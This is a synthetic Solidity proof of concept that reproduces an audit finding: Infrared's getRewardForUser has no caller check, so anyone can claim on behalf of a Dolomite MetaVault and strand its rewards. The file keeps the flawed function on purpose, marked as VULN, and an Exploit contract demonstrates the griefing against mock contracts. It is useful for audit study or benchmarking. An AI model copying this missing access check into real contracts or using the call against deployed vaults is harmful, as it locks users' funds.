// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Dolomite POLVaults — Infrared getRewardForUser is permissionless
    (Cyfrin, Dolomite POLVaults 2025-04-24, AuditVault 55624).
    SYNTHETIC, cheatcode-free. The blamed public claim is preserved (@> VULN).

    getRewardForUser(user) pays `user` and zeros their reward entry. Anyone
    can pass the MetaVault. The tokens land on the MetaVault, but
    _performDepositRewardByRewardType only forwards the amount it was told,
    which is now 0. The reward sits in the MetaVault and the owner cannot
    claim it. The fix adds token.balanceOf(address(this)) to that amount. */

contract Reward {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] = balanceOf[to] + amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] = balanceOf[msg.sender] - amount;
        balanceOf[to] = balanceOf[to] + amount;
        return true;
    }
}

contract InfraredVault {
    Reward public token;
    mapping(address => uint256) public rewards;

    constructor(Reward _token) {
        token = _token;
    }

    function seed(address user, uint256 amount) external {
        token.mint(address(this), amount);
        rewards[user] = rewards[user] + amount;
    }

    function earned(address user) external view returns (uint256) {
        return rewards[user];
    }

    /// @dev Audited MultiRewards.getRewardForUser. No `msg.sender == _user` check.
    function getRewardForUser(address _user) public {
        uint256 reward = rewards[_user];
        if (reward > 0) {
            // @> VULN: any caller pays `_user` and then clears the claimable balance.
            token.transfer(_user, reward);
            rewards[_user] = 0;
        }
    }
}

contract InfraredBGTMetaVault {
    InfraredVault public infra;
    Reward public token;
    address public owner;
    uint256 public forwarded;

    constructor(InfraredVault _infra, Reward _token, address _owner) {
        infra = _infra;
        token = _token;
        owner = _owner;
    }

    function claim() external returns (uint256 paid) {
        uint256 amount = infra.earned(address(this));
        infra.getRewardForUser(address(this));
        paid = _performDepositRewardByRewardType(amount);
    }

    function _performDepositRewardByRewardType(uint256 _amount) internal returns (uint256) {
        if (_amount == 0) {
            return 0;
        }
        token.transfer(owner, _amount);
        forwarded = forwarded + _amount;
        return _amount;
    }
}

contract Exploit {
    address public constant OWNER = address(0xBEEF);
    uint256 public constant N = 1000 ether;

    Reward public token; // nonce 1
    InfraredVault public infra; // nonce 2
    InfraredBGTMetaVault public meta; // nonce 3
    uint256 public claimable;
    uint256 public earnedAfter;
    uint256 public stuck;
    uint256 public ownerBal;

    constructor() {
        token = new Reward();
        infra = new InfraredVault(token);
        meta = new InfraredBGTMetaVault(infra, token, OWNER);
    }

    function run() external {
        infra.seed(address(meta), N);
        claimable = infra.earned(address(meta));
        infra.getRewardForUser(address(meta));
        earnedAfter = infra.earned(address(meta));
        meta.claim();
        stuck = token.balanceOf(address(meta));
        ownerBal = token.balanceOf(OWNER);
        require(claimable == N, "rewards were not claimable");
        require(earnedAfter == 0, "accounting not cleared");
        require(stuck == N, "rewards not stuck in the metavault");
        require(ownerBal == 0, "owner still received rewards");
        require(meta.forwarded() == 0, "claim forwarded something");
    }
}
